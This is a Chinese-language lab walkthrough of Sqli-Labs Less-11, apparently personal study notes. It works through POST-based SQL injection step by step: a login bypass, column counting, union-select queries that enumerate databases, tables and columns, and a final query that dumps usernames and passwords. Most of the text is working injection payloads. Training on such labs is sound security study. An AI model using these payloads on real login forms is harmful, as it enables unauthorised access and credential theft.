Sqli-Labs-Level11学习

level-11

创建日期 星期日 18 十一月 2018

http://127.0.0.1/SQL/Less-11/index.php

输入admin，密码111111

当输入admin’# ，密码任意。
返回

用户名输入 test’ order by 2# ，密码任意
返回

密码输入test’ order by 3#

得到字段为2

用户名输入test’ union select 1,database()#，密码任意

得到

得到数据库security

用户名输入test’ union select version(),database()#，密码任意，得到

uname=test’ union select 1,(select schema_name from information_schema.schemata limit 0,1)#&passwd=1&submit=Submit
得到数据库information_schema

uname=test’ union select 1,(select schema_name from information_schema.schemata limit 1,1)#&passwd=1&submit=Submit
得到数据库：challenges

uname=test’ union select 1,(select schema_name from information_schema.schemata limit 2,1)#&passwd=1&submit=Submit
得到数据库mysql

uname=test’ union select 1,(select schema_name from information_schema.schemata limit 3,1)#&passwd=1&submit=Submit
得到数据库performance_schema

uname=test’ union select 1,(select schema_name from information_schema.schemata limit 4,1)#&passwd=1&submit=Submit
得到数据库security

uname=test’ union select 1,(select schema_name from information_schema.schemata limit 5,1)#&passwd=1&submit=Submit
得到数据库test

也可以执行
uname=test’ union select 1,(select group_concat(schema_name) from information_schema.schemata)#&passwd=1&submit=Submit
得到数据库名：information_schema,challenges,mysql,performance_schema,security,test

获取表名。

uname=test’ union select 1,(select table_name from information_schema.tables where table_schema=’security’ limit 0,1)#&passwd=1&submit=Submit
得到表名 emails

uname=test’ union select 1,(select table_name from information_schema.tables where table_schema=’security’ limit 1,1)#&passwd=1&submit=Submit
得到表名referers

uname=test’ union select 1,(select table_name from information_schema.tables where table_schema=’security’ limit 2,1)#&passwd=1&submit=Submit
得到表名uagents

uname=test’ union select 1,(select table_name from information_schema.tables where table_schema=’security’ limit 3,1)#&passwd=1&submit=Submit
得到表名users

也可以执行
uname=test’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’)#&passwd=1&submit=Submit
得到所有的表（security）：
emails,referers,uagents,users

获取字段名。

uname=test’ union select 1,(select column_name from information_schema.columns where table_name=’users’ limit 0,1)#&passwd=1&submit=Submit
得到字段id

uname=test’ union select 1,(select column_name from information_schema.columns where table_name=’users’ limit 1,1)#&passwd=1&submit=Submit
得到字段username

uname=test’ union select 1,(select column_name from information_schema.columns where table_name=’users’ limit 2,1)#&passwd=1&submit=Submit
得到字段password

也可以执行
uname=test’ union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’users’)#&passwd=1&submit=Submit
得到id,username,password

获取数据。

uname=test’ union select 1,(select group_concat(id,’|’,username,’|’,password) from users)#&passwd=1&submit=Submit
得到
